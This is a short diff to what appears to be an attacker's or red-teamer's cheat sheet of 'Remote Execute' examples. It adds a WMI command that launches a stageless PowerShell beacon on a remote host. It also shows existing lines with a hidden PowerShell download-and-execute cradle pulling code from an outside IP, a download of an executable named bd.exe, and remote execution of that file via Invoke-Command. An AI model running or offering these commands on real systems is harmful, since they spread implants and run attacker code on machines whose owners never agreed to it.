@@ -133,6 +133,7 @@ MSBuild Beacon
 
 Remote Execute
   Examples:
+      remote-exec wmi 10.9.15.200 powershell.exe -f c:\windows\temp\beacon.ps1 (stageless PS beacon)
       powershell.exe -nop -w hidden -c iex (new-object net.webclient).downloadstring('http://10.10.16.13/cyber')
       Invoke-WebRequest "http://10.10.16.13/bd" -OutFile "C:\users\public\downloads\bd.exe"
       Invoke-Command -computername HOSTNAME -scriptblock {"C:\users\public\downloads\bd.exe" -AsJob}
